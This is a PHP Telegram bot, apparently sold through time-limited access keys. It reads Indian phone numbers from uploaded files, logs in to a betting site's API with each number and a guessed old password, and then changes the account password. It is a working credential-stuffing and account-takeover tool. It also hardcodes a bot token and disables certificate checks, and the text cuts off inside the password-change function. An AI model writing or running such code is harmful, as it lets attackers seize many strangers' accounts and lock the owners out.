<?php
define('BOT_TOKEN', '9007102315:AAFgO1DswluchSHcs7cQlv2u4s-4LNzDAiM');
define('API_BASE', 'https://api.telegram.org/bot' . BOT_TOKEN . '/');

define('ADMIN_ID', 8447852036);
define('DATA_DIR', __DIR__ . '/data');

define('SITE_REFER_URL', 'https://www.lotus365.bio');
define('LOGIN_API_URL', 'https://click11.hurry2.net/api/user-login');
define('CHANGE_PASS_API_URL', 'https://click11.hurry2.net/api/change-my-password');

define('PAGE_SIZE', 8);
define('MAX_NUMBERS_PER_RUN', 2500);
define('PROGRESS_INTERVAL', 0.35);
define('WORKER_SECRET', 'wsec_' . hash('sha256', BOT_TOKEN . '|l365_fast_pass_clean'));

@mkdir(DATA_DIR, 0777, true);
@chmod(DATA_DIR, 0777);

ini_set('log_errors', '1');
ini_set('error_log', DATA_DIR . '/bot_error.log');
ignore_user_abort(true);
set_time_limit(0);

function logBotErr($msg) {
    @file_put_contents(DATA_DIR . '/bot_error.log', '[' . date('Y-m-d H:i:s') . '] ' . $msg . "\n", FILE_APPEND);
}

if (!defined('BOT_LIB_ONLY')) {
    if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'GET' && empty($_GET['ping_silent'])) {
        http_response_code(200);
        header('Content-Type: text/plain; charset=utf-8');
        echo 'OK';
        exit;
    }
    http_response_code(200);
    header('Content-Type: application/json; charset=utf-8');
    echo '{"ok":true}';
    if (function_exists('fastcgi_finish_request')) {
        @fastcgi_finish_request();
    } else {
        while (ob_get_level() > 0) { @ob_end_flush(); }
        @flush();
    }
}

function isAdmin($uid) {
    return (int)$uid > 0 && (int)$uid === (int)ADMIN_ID;
}

function loadJson($name, $default = []) {
    $p = DATA_DIR . '/' . $name;
    if (!file_exists($p)) return $default;
    $fp = @fopen($p, 'r');
    if (!$fp) return $default;
    @flock($fp, LOCK_SH);
    $d = stream_get_contents($fp);
    @flock($fp, LOCK_UN);
    @fclose($fp);
    if ($d === false || trim($d) === '') return $default;
    $j = json_decode($d, true);
    return is_array($j) ? $j : $default;
}

function saveJson($name, $data) {
    $p = DATA_DIR . '/' . $name;
    $fp = @fopen($p, 'c+');
    if (!$fp) {
        @file_put_contents($p, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
        return true;
    }
    @flock($fp, LOCK_EX);
    @ftruncate($fp, 0);
    @rewind($fp);
    @fwrite($fp, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    @fflush($fp);
    @flock($fp, LOCK_UN);
    @fclose($fp);
    return true;
}

function tg($method, $params = []) {
    $ch = curl_init(API_BASE . $method);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($params, JSON_UNESCAPED_UNICODE),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_TIMEOUT => 12,
        CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $res = curl_exec($ch);
    if ($res === false) {
        logBotErr("TG error ($method): " . curl_error($ch));
    }
    curl_close($ch);
    $decoded = json_decode((string)$res, true);
    return is_array($decoded) ? $decoded : ['ok' => false];
}

function ensureSideMenuCommands() {
    $flag_file = DATA_DIR . '/commands_set_l365_clean.flag';
    if (file_exists($flag_file)) return;
    $commands = [
        ['command' => 'start', 'description' => 'Start Bot'],
        ['command' => 'run', 'description' => 'Auto Mode'],
        ['command' => 'stop', 'description' => 'Stop Process'],
        ['command' => 'clear', 'description' => 'Clear Session'],
        ['command' => 'key', 'description' => 'Enter Key'],
    ];
    $res = tg('setMyCommands', ['commands' => $commands]);
    if (!empty($res['ok'])) {
        tg('setChatMenuButton', ['menu_button' => ['type' => 'commands']]);
        @file_put_contents($flag_file, date('Y-m-d H:i:s'));
    }
}

function utf16_len($s) {
    $s = (string)$s;
    if (function_exists('mb_convert_encoding')) {
        return (int)(strlen(mb_convert_encoding($s, 'UTF-16LE', 'UTF-8')) / 2);
    }
    return strlen($s);
}

function safeUniChar($cp) {
    if (function_exists('mb_chr')) {
        $c = @mb_chr($cp, 'UTF-8');
        if ($c !== false && $c !== '') return $c;
    }
    if (class_exists('IntlChar')) {
        $c = @IntlChar::chr($cp);
        if ($c !== false && $c !== null) return $c;
    }
    $dec = @html_entity_decode('&#' . (int)$cp . ';', ENT_NOQUOTES, 'UTF-8');
    return $dec ?: '';
}

function math_font($t) {
    static $m = null;
    if ($m === null) {
        $m = [];
        for ($i = 0; $i < 26; $i++) {
            $u = safeUniChar(0x1D63C + $i);
            $l = safeUniChar(0x1D656 + $i);
            if ($u !== '') $m[chr(65 + $i)] = $u;
            if ($l !== '') $m[chr(97 + $i)] = $l;
        }
    }
    return empty($m) ? (string)$t : strtr((string)$t, $m);
}

function upperText($s) {
    if (function_exists('mb_strtoupper')) return mb_strtoupper((string)$s, 'UTF-8');
    return strtoupper((string)$s);
}

function build_parts($parts, $bold = true, $uc = true, $bq = true) {
    $text = '';
    $ents = [];
    $off = 0;
    foreach ($parts as $p) {
        $disp = (string)($p[0] ?? '');
        $etype = $p[2] ?? null;
        $isUrl = (bool)preg_match('#https?://#i', trim($disp));
        $isPhoneOnly = (bool)preg_match('#^[6-9]\d{9}$#', trim($disp));
        $skipStyle = $isUrl || $isPhoneOnly || $etype;
        if ($uc && !$skipStyle) $disp = upperText($disp);
        if (!$skipStyle) $disp = math_font($disp);

        $len = utf16_len($disp);
        if ($len > 0) {
            if ($etype) $ents[] = ['type' => $etype, 'offset' => $off, 'length' => $len];
            elseif ($bold) $ents[] = ['type' => 'bold', 'offset' => $off, 'length' => $len];
        }
        $text .= $disp;
        $off += $len;
    }
    $totalLen = utf16_len($text);
    if ($bq && $totalLen > 0) {
        $ents[] = ['type' => 'blockquote', 'offset' => 0, 'length' => $totalLen];
    }
    return [$text, $ents];
}

function send_premium($chat_id, $parts, $kb = null, $bq = true) {
    list($text, $ents) = build_parts($parts, true, true, $bq);
    $p = [
        'chat_id' => $chat_id,
        'text' => $text,
        'entities' => $ents,
        'link_preview_options' => ['is_disabled' => true],
    ];
    if ($kb) $p['reply_markup'] = $kb;
    $res = tg('sendMessage', $p);
    if (empty($res['ok'])) {
        $fallback = [
            'chat_id' => $chat_id,
            'text' => $text,
            'link_preview_options' => ['is_disabled' => true],
        ];
        if ($kb) $fallback['reply_markup'] = $kb;
        return tg('sendMessage', $fallback);
    }
    return $res;
}

function edit_premium($chat_id, $mid, $parts, $kb = null) {
    list($text, $ents) = build_parts($parts, true, true, true);
    $p = [
        'chat_id' => $chat_id,
        'message_id' => $mid,
        'text' => $text,
        'entities' => $ents,
        'link_preview_options' => ['is_disabled' => true],
    ];
    if ($kb) $p['reply_markup'] = $kb;
    return tg('editMessageText', $p);
}

function sendDocumentFile($chat_id, $filePath, $mimeType, $caption = '') {
    $ch = curl_init(API_BASE . 'sendDocument');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => [
            'chat_id' => $chat_id,
            'document' => new CURLFile($filePath, $mimeType, basename($filePath)),
            'caption' => $caption,
            'parse_mode' => 'HTML',
        ],
        CURLOPT_TIMEOUT => 45,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode((string)$res, true);
}

/* ================= KEY SYSTEM ================= */

function parseDurationToSeconds($raw) {
    $s = strtolower(trim((string)$raw));
    if ($s === '' || in_array($s, ['unlimited', 'perm', 'permanent', 'life', 'lifetime', '0', 'inf'])) {
        return ['seconds' => null, 'label' => 'UNLIMITED'];
    }
    if (!preg_match('/^(\d+)\s*(m|min|mins|minute|minutes|h|hr|hrs|hour|hours|d|day|days|w|wk|wks|week|weeks)$/i', $s, $m)) {
        return null;
    }
    $val = (int)$m[1];
    if ($val <= 0) return null;
    $unit = strtolower($m[2][0]);
    if ($unit === 'm') return ['seconds' => $val * 60, 'label' => $val . ' MINUTE(S)'];
    if ($unit === 'h') return ['seconds' => $val * 3600, 'label' => $val . ' HOUR(S)'];
    if ($unit === 'd') return ['seconds' => $val * 86400, 'label' => $val . ' DAY(S)'];
    if ($unit === 'w') return ['seconds' => $val * 604800, 'label' => $val . ' WEEK(S)'];
    return null;
}

function formatRemainingTime($expiresAt) {
    if ($expiresAt === null) return 'UNLIMITED';
    $diff = (int)$expiresAt - time();
    if ($diff <= 0) return 'EXPIRED';
    $days = floor($diff / 86400);
    $hours = floor(($diff % 86400) / 3600);
    $mins = floor(($diff % 3600) / 60);
    $secs = $diff % 60;
    $parts = [];
    if ($days > 0) $parts[] = $days . 'd';
    if ($hours > 0) $parts[] = $hours . 'h';
    if ($mins > 0) $parts[] = $mins . 'm';
    if ($days === 0 && $hours === 0) $parts[] = $secs . 's';
    return implode(' ', $parts);
}

function randomSuffixCode($lenDigits = 3, $lenLetters = 2) {
    $digits = '';
    for ($i = 0; $i < $lenDigits; $i++) $digits .= (string)random_int(0, 9);
    $letters = '';
    for ($i = 0; $i < $lenLetters; $i++) $letters .= chr(random_int(65, 90));
    return $digits . $letters;
}

function getKeysDb() { return loadJson('keys.json', []); }
function saveKeysDb($db) { return saveJson('keys.json', $db); }

function createAccessKey($customKey, $durationRaw) {
    $parsed = parseDurationToSeconds($durationRaw);
    if ($parsed === null) return ['ok' => false, 'error' => 'INVALID DURATION (USE: 30m, 2h, 1d, 7d, 30d, OR UNLIMITED)'];

    $db = getKeysDb();
    $rawInput = strtoupper(trim((string)$customKey));

    if ($rawInput === '' || in_array($rawInput, ['AUTO', 'RANDOM', 'GEN', 'NEW'])) {
        $prefix = 'L365';
        $code = '';
        for ($attempt = 0; $attempt < 30; $attempt++) {
            $candidate = $prefix . randomSuffixCode(3, 2);
            if (!isset($db[$candidate])) { $code = $candidate; break; }
        }
        if ($code === '') $code = $prefix . strtoupper(bin2hex(random_bytes(3)));
    } else {
        $cleanPrefix = preg_replace('/[^A-Z0-9_-]/', '', $rawInput);
        if (strlen($cleanPrefix) < 2 || strlen($cleanPrefix) > 35) {
            return ['ok' => false, 'error' => 'KEY LENGTH MUST BE 2-35 CHARS (A-Z, 0-9, _, -)'];
        }
        if (isset($db[$cleanPrefix])) {
            $code = '';
            for ($attempt = 0; $attempt < 30; $attempt++) {
                $candidate = $cleanPrefix . randomSuffixCode(3, 2);
                if (!isset($db[$candidate])) { $code = $candidate; break; }
            }
            if ($code === '') return ['ok' => false, 'error' => 'COULD NOT GENERATE UNIQUE KEY'];
        } else {
            $code = $cleanPrefix;
        }
    }

    $db[$code] = [
        'key' => $code,
        'duration_sec' => $parsed['seconds'],
        'duration_label' => $parsed['label'],
        'created_at' => time(),
        'activated_at' => null,
        'expires_at' => null,
        'assigned_to' => null,
        'active' => true,
    ];
    saveKeysDb($db);
    return ['ok' => true, 'entry' => $db[$code]];
}

function deleteAccessKey($code) {
    $code = strtoupper(trim((string)$code));
    $db = getKeysDb();
    if (!isset($db[$code])) return false;
    unset($db[$code]);
    saveKeysDb($db);
    return true;
}

function redeemAccessKey($uid, $code) {
    $code = strtoupper(trim((string)$code));
    $db = getKeysDb();
    if (!isset($db[$code])) return ['ok' => false, 'msg' => 'INVALID KEY. CHECK AND TRY AGAIN.'];
    $entry = $db[$code];
    if (empty($entry['active'])) return ['ok' => false, 'msg' => 'THIS KEY IS INACTIVE / DELETED.'];

    $now = time();
    if ($entry['expires_at'] !== null && $now >= (int)$entry['expires_at']) {
        unset($db[$code]); saveKeysDb($db);
        return ['ok' => false, 'msg' => 'THIS KEY HAS EXPIRED.'];
    }
    if ($entry['assigned_to'] !== null && (int)$entry['assigned_to'] !== (int)$uid) {
        return ['ok' => false, 'msg' => 'THIS KEY IS ALREADY USED BY ANOTHER USER.'];
    }
    if ($entry['activated_at'] === null) {
        $entry['activated_at'] = $now;
        $entry['assigned_to'] = (int)$uid;
        $entry['expires_at'] = ($entry['duration_sec'] !== null) ? ($now + (int)$entry['duration_sec']) : null;
        $db[$code] = $entry;
        saveKeysDb($db);
    }
    return ['ok' => true, 'entry' => $entry];
}

function getUserActiveKey($uid) {
    if (isAdmin($uid)) {
        return ['key' => 'ADMIN-ACCESS', 'duration_label' => 'UNLIMITED', 'expires_at' => null, 'remaining' => 'UNLIMITED'];
    }
    $db = getKeysDb();
    $now = time();
    $changed = false;
    $activeKey = null;
    foreach ($db as $code => $entry) {
        if ((int)($entry['assigned_to'] ?? 0) === (int)$uid) {
            if ($entry['expires_at'] !== null && $now >= (int)$entry['expires_at']) {
                unset($db[$code]); $changed = true;
            } elseif (!empty($entry['active'])) {
                $activeKey = $entry;
                $activeKey['remaining'] = formatRemainingTime($entry['expires_at']);
            }
        }
    }
    if ($changed) saveKeysDb($db);
    return $activeKey;
}

function hasValidKey($uid) {
    if (isAdmin($uid)) return true;
    return getUserActiveKey($uid) !== null;
}

/* ================= KEYBOARDS & STATE ================= */

function mainMenuKeyboard($uid = 0) {
    $rows = [
        [['text' => 'AUTO MODE']],
        [['text' => 'ENTER KEY'], ['text' => 'CANCEL']],
    ];
    if (isAdmin($uid)) {
        $rows[] = [
            ['text' => 'GEN KEY'],
            ['text' => 'LIST KEYS'],
            ['text' => 'DEL KEY'],
        ];
    }
    return ['keyboard' => $rows, 'resize_keyboard' => true];
}

function cancelKeyboard() {
    return ['keyboard' => [[['text' => 'CANCEL']]], 'resize_keyboard' => true];
}

function getUsers() { return loadJson('users.json', []); }
function saveUsers($u) { return saveJson('users.json', $u); }
function getStates() { return loadJson('states.json', []); }
function saveStates($s) { return saveJson('states.json', $s); }
function getState($uid) { $s = getStates(); return $s[$uid] ?? null; }
function setState($uid, $s) { $a = getStates(); $a[$uid] = $s; saveStates($a); }
function clearState($uid) { $a = getStates(); unset($a[$uid]); saveStates($a); }

function ensureUser($uid,$name = '', $username = '') {$u = getUsers();
    if (!isset($u[$uid])) {$u[$uid] = ['id' =>$uid, 'name' => $name, 'username' =>$username, 'joined_at' => date('Y-m-d H:i:s')];
        saveUsers($u);
    }
}

/* ================= NUMBER & PDF EXTRACTION ================= */

function extractPhoneNumbersFromText($text) {$phones = [];
    if (preg_match_all('/(?:\+91|91|0)?([6-9]\d{9})/', (string)$text,$m)) {
        foreach ($m[1] as$p) {
            if (!in_array($p,$phones, true)) $phones[] =$p;
        }
    }
    return $phones;
}

function extractPhoneNumbersFromFile($fileId) {
    $info = tg('getFile', ['file_id' =>$fileId]);
    $filePath =$info['result']['file_path'] ?? '';
    if ($filePath === '') return [];

    $dlUrl = 'https://api.telegram.org/file/bot' . BOT_TOKEN . '/' . ltrim($filePath, '/');$tmpBase = DATA_DIR . '/inp_' . uniqid('', true);
    $rawFile = $tmpBase . '_' . basename($filePath);

    $ch = curl_init($dlUrl);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 25,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $bin = curl_exec($ch);
    curl_close($ch);
    if (!$bin) return [];

    @file_put_contents($rawFile, $bin);$textContent = '';

    if (preg_match('/\.pdf$/i', $rawFile)) {
        $txtOut =$tmpBase . '.txt';
        @exec('pdftotext ' . escapeshellarg($rawFile) . ' ' . escapeshellarg($txtOut) . ' 2>/dev/null');
        if (file_exists($txtOut)) {
            $textContent = (string)@file_get_contents($txtOut);
            @unlink($txtOut);
        } else {
            $textContent = (string)$bin;
        }
    } else {
        $textContent = (string)$bin;
    }

    @unlink($rawFile);
    return extractPhoneNumbersFromText($textContent);
}

/* ================= LOGIN & PASSWORD CHANGE APIs ================= */

function extractAuthToken($json,$raw = '') {
    $candidates = [$json['token'] ?? null,
        $json['access_token'] ?? null,
        $json['auth_token'] ?? null,
        $json['jwt'] ?? null,
        $json['data']['token'] ?? null,
        $json['data']['access_token'] ?? null,
        $json['data']['auth_token'] ?? null,
        $json['result']['token'] ?? null,
        $json['result']['access_token'] ?? null,
    ];
    foreach ($candidates as$c) {
        if (is_string($c) && trim($c) !== '') return trim($c);
    }
    if (preg_match('/"token"\s*:\s*"([^"]+)"/i', $raw, $m)) return$m[1];
    return '';
}

function isLoginSuccessResponse($code,$json, $raw,$token) {
    if ($code < 200 ||$code >= 300) return false;
    if ($token !== '') return true;
    if (is_array($json)) {
        if (!empty($json['success']) || !empty($json['status']) || !empty($json['logged_in']) || !empty($json['is_login'])) {
            $st = strtolower((string)($json['status'] ?? ''));
            if (!in_array($st, ['false', 'fail', 'failed', 'error', 'invalid', '0'], true)) return true;
        }
        $msg = strtolower((string)($json['message'] ?? $json['msg'] ?? ''));
        if (preg_match('/\b(login\s*success|logged\s*in|success|authenticated|welcome)\b/', $msg) && !preg_match('/\b(fail|invalid|wrong|error|incorrect)\b/',$msg)) {
            return true;
        }
    }
    $low = strtolower((string)$raw);
    if (preg_match('/\b(login\s*success|logged\s*in)\b/', $low) && !preg_match('/\b(fail|invalid|wrong|error|incorrect)\b/',$low)) {
        return true;
    }
    return false;
}

function sendApiRequest($url, $payloadArray,$extraHeaders = [], $cookieJar = '',$asForm = false) {
    $headers = array_merge([
        'Accept: application/json, text/plain, */*',
        'Origin: ' . SITE_REFER_URL,
        'Referer: ' . SITE_REFER_URL . '/',
        'User-Agent: Mozilla/5.0 (Linux; Android 13; SM-A155F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    ], $extraHeaders);

    if ($asForm) {$headers[] = 'Content-Type: application/x-www-form-urlencoded';
        $body = http_build_query($payloadArray);
    } else {
        $headers[] = 'Content-Type: application/json';
        $body = json_encode($payloadArray, JSON_UNESCAPED_SLASHES);
    }

    $ch = curl_init($url);$opts = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $body,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_TIMEOUT => 6,
        CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_SSL_VERIFYPEER => false,
    ];
    if ($cookieJar !== '') {
        $opts[CURLOPT_COOKIEJAR] =$cookieJar;
        $opts[CURLOPT_COOKIEFILE] =$cookieJar;
    }
    curl_setopt_array($ch,$opts);
    $raw = curl_exec($ch);
    $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $json = json_decode((string)$raw, true);
    return [$code, is_array($json) ? $json : [], (string)$raw];
}

function callLoginEndpoint($phone,$oldPassword, $cookieJar) {$payload = [
        'mobile' => $phone,
        'phone' => $phone,
        'username' => $phone,
        'user_name' => $phone,
        'userName' => $phone,
        'password' => $oldPassword,
        'countrycode' => '91',
        'country_code' => '+91',
    ];

    [$code, $json,$raw] = sendApiRequest(LOGIN_API_URL, $payload, [],$cookieJar, false);
    $token = extractAuthToken($json, $raw);$ok = isLoginSuccessResponse($code,$json, $raw,$token);

    if (!$ok) {
        [$code2,$json2, $raw2] = sendApiRequest(LOGIN_API_URL,$payload, [], $cookieJar, true);$token2 = extractAuthToken($json2,$raw2);
        if (isLoginSuccessResponse($code2,$json2, $raw2,$token2)) {
            return ['ok' => true, 'token' => $token2];
        }
    }

    return ['ok' => $ok, 'token' =>$token];
}

function isPasswordChangeSuccess($code, $json,$raw) {
    if ($code < 200 ||$code >= 300) return false;
    $msg = strtolower((string)($json['message'] ?? $json['msg'] ?? $raw ?? ''));
    if (preg_match('/\b(fail|invalid|wrong|error|incorrect|reject|not\s*match)\b/', $msg)) {
        return false;
    }
    if (!empty($json['success']) || (isset($json['status']) && in_array(strtolower((string)$json['status']), ['1', 'true', 'success', 'ok'], true))) {
        return true;
    }
    if (preg_match('/\b(password\s*changed|changed\s*successfully|password\s*updated|updated\s*successfully|success)\b/', $msg)) {
        return true;
    }
    return false;
}

function callChangePasswordEndpoint($phone,$oldPassword, $newPassword,$token, $cookieJar) {$extraHeaders = [];
    if ($token !== '') {
        $extraHeaders[] = 'Authorization: Bearer ' .$token;
        $extraHeaders[] = 'Authorization: ' .$token;
        $extraHeaders[] = 'token: ' .$token;
    }

    $payload = [
        'mobile' => $phone,
        'phone' => $phone,
        'username' => $phone,
        'current_password' => $oldPassword,
        'currentPassword' => $oldPassword,
        'old_password' => $oldPassword,
        'oldPassword' => $oldPassword,
        'password' => $newPassword,
        'new_password' => $newPassword,
        'newPassword' => $newPassword,
        'confirm_password' => $newPassword,
        '
